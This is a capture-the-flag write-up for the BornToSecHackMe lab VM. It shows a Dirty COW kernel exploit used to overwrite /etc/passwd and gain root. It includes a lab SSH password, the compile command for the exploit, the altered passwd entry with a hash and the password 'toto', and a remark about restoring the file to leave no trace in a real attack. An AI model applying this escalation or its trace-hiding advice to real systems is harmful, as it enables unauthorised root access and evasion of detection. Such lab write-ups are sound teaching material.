## 1- Getting a ssh access to the server

- Follow the strategy explained in `writeup1.md` until the point where you can log in ssh as user `laurie`. This is not totally mandatory but of course it's much easier to work from a ssh connection rather than on the VM directly where you can't even copy/paste from your host machine.

- Login to the server through SSH with `ssh laurie@192.168.56.3 -p 22` : `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`

## 2- Dirty cow exploit

- Thanks to the command `uname -a` we could get info about the architecture of the server :
```
laurie@BornToSecHackMe:/tmp$ uname -a
Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/Linux
```

- We can notice that the kernel version 3.2.0 is pretty old and subject to some security breaches, one of the most famous being the dirty cow exploit.

- This exploit creates a race condition between system calls `write` and `madvise` that basically allow a user to write in files which are normally readable only. More info there: https://www.cs.toronto.edu/~arnold/427/18s/427_18S/indepth/dirty-cow/demo.html

- On a GNU/linux system, the root user is defined by its user ID of 0, and the list of users with their user ID is accessible in the read only file `/etc/passwd`. Here's the original content of this file:

```
laurie@BornToSecHackMe:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
whoopsie:x:103:107::/nonexistent:/bin/false
landscape:x:104:110::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
ft_root:x:1000:1000:ft_root,,,:/home/ft_root:/bin/bash
mysql:x:106:115:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:107:116:ftp daemon,,,:/srv/ftp:/bin/false
lmezard:x:1001:1001:laurie,,,:/home/lmezard:/bin/bash
laurie@borntosec.net:x:1002:1002:Laurie,,,:/home/laurie@borntosec.net:/bin/bash
laurie:x:1003:1003:,,,:/home/laurie:/bin/bash
thor:x:1004:1004:,,,:/home/thor:/bin/bash
zaz:x:1005:1005:,,,:/home/zaz:/bin/bash
dovecot:x:108:117:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:109:65534:Dovecot login user,,,:/nonexistent:/bin/false
postfix:x:110:118::/var/spool/postfix:/bin/false

```
- We can clearly see the root user with its user ID of 0 on top of the list.

- So the idea is to use this dirtycow exploit to modify that file and make it so one of the users, for instance zaz, gets a user ID of 0 and is considered root by the system.

- We found online a little c program that does just that, by using thread in loops in order to provoke the data race situation needed to overwrite the read only file `/etc/passwd` (see `dirty.c` in `resources` folder, compile with `gcc -pthread dirty.c -o dirty -lcrypt`)

- After running this program, if everything went well (which it doesn't systematically do, sometimes it doesn't write its line properly to `/etc/passwd`), our zaz user now has a user ID of 0 and will therefore be considered root by the system, giving it all privileges. Here's the updated version of `/etc/passwd` :
```
laurie@BornToSecHackMe:~$ cat /etc/passwd
zaz:firwVQs3fu3rM:0:0:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
whoopsie:x:103:107::/nonexistent:/bin/false
landscape:x:104:110::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
ft_root:x:1000:1000:ft_root,,,:/home/ft_root:/bin/bash
mysql:x:106:115:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:107:116:ftp daemon,,,:/srv/ftp:/bin/false
lmezard:x:1001:1001:laurie,,,:/home/lmezard:/bin/bash
laurie@borntosec.net:x:1002:1002:Laurie,,,:/home/laurie@borntosec.net:/bin/bash
laurie:x:1003:1003:,,,:/home/laurie:/bin/bash
thor:x:1004:1004:,,,:/home/thor:/bin/bash
zaz:x:1005:1005:,,,:/home/zaz:/bin/bash
dovecot:x:108:117:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:109:65534:Dovecot login user,,,:/nonexistent:/bin/false
postfix:x:110:118::/var/spool/postfix:/bin/false
```
- So now we can log in as zaz (with our new password : toto) to get full root access to the machine. Of course, in a real attack situation, it would be important to restore the old `/etc/passwd` to leave no trace. 
```
laurie@BornToSecHackMe:~$ su zaz
Password: 
zaz@BornToSecHackMe:/home/laurie# cd /root
zaz@BornToSecHackMe:/root# ls
README
zaz@BornToSecHackMe:/root# cat README 
CONGRATULATIONS !!!!
To be continued...
zaz@BornToSecHackMe:/root# id
uid=0(zaz) gid=0(root) groups=0(root)
```